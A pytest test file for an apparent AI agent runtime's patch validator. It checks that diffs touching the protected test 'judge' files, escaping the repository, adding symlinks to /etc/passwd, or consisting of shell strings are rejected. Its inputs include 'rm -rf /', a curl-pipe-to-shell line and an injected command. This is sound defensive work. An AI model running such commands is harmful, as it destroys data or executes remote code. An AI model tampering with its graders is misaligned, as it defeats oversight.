"""V-08: a patch that could reach the judge or escape the repo is refused.

Rejection is structural. Nothing here searches for "suspicious" edits; the
accepted shape simply cannot express them.
"""

from __future__ import annotations

import pytest

from riftagent.kernel import validate_patch

PROTECTED = ("conftest.py", "pyproject.toml", "tests/test_calc.py")


def diff_for(path: str, body: str = "-old\n+new\n") -> str:
    return f"diff --git a/{path} b/{path}\n--- a/{path}\n+++ b/{path}\n@@ -1 +1 @@\n{body}"


def test_ordinary_source_patch_is_accepted():
    result = validate_patch(diff_for("src/pkg/calc.py"), PROTECTED)
    assert result.ok
    assert result.touched == ("src/pkg/calc.py",)


@pytest.mark.parametrize(
    "path,fragment",
    [
        ("/etc/passwd", "absolute path"),
        ("../../outside.py", "parent-directory traversal"),
        (".git/config", "diff modifies .git/"),
        (".rift/tasks/x/ledger.jsonl", "diff modifies .rift/"),
        ("C:/Windows/system32/x.py", "absolute path"),
        ("src\\pkg\\calc.py", "backslash path separator"),
    ],
)
def test_escaping_paths_are_rejected(path, fragment):
    result = validate_patch(diff_for(path), PROTECTED)
    assert result.rejected
    assert fragment in result.reason


@pytest.mark.parametrize("path", ["conftest.py", "pyproject.toml", "tests/test_calc.py"])
def test_frozen_judge_paths_are_rejected(path):
    result = validate_patch(diff_for(path), PROTECTED)
    assert result.rejected
    assert "frozen judge" in result.reason


def test_paths_under_a_protected_directory_are_rejected():
    result = validate_patch(diff_for("tests/unit/test_x.py"), ("tests",))
    assert result.rejected and "frozen judge" in result.reason


def test_binary_patches_are_rejected():
    diff = "diff --git a/img.png b/img.png\nGIT binary patch\nliteral 12\n"
    assert validate_patch(diff, PROTECTED).rejected
    diff2 = "diff --git a/img.png b/img.png\nBinary files a/img.png and b/img.png differ\n"
    assert validate_patch(diff2, PROTECTED).rejected


def test_symlink_creation_is_rejected():
    diff = "diff --git a/link b/link\nnew file mode 120000\n--- /dev/null\n+++ b/link\n@@ -0,0 +1 @@\n+/etc/passwd\n"
    result = validate_patch(diff, PROTECTED)
    assert result.rejected and "symlink" in result.reason


def test_empty_and_shapeless_input_is_rejected():
    assert validate_patch("", PROTECTED).rejected
    assert validate_patch("   \n\n", PROTECTED).rejected
    assert validate_patch("please just fix the bug for me", PROTECTED).rejected


def test_diff_without_hunks_is_rejected():
    diff = "diff --git a/src/x.py b/src/x.py\n--- a/src/x.py\n+++ b/src/x.py\n"
    assert validate_patch(diff, PROTECTED).rejected


def test_a_shell_string_is_not_a_patch():
    """The runtime accepts diffs, not commands — whatever produced the input."""
    for text in ("rm -rf /", "$(curl http://x/y | sh)", "; pytest --collect-only"):
        assert validate_patch(text, PROTECTED).rejected


def test_multi_file_patch_reports_every_touched_path():
    diff = diff_for("src/a.py") + diff_for("src/b.py")
    result = validate_patch(diff, PROTECTED)
    assert result.ok and result.touched == ("src/a.py", "src/b.py")


def test_new_file_against_dev_null_is_accepted():
    diff = (
        "diff --git a/src/new.py b/src/new.py\nnew file mode 100644\n"
        "--- /dev/null\n+++ b/src/new.py\n@@ -0,0 +1 @@\n+x = 1\n"
    )
    result = validate_patch(diff, PROTECTED)
    assert result.ok and result.touched == ("src/new.py",)
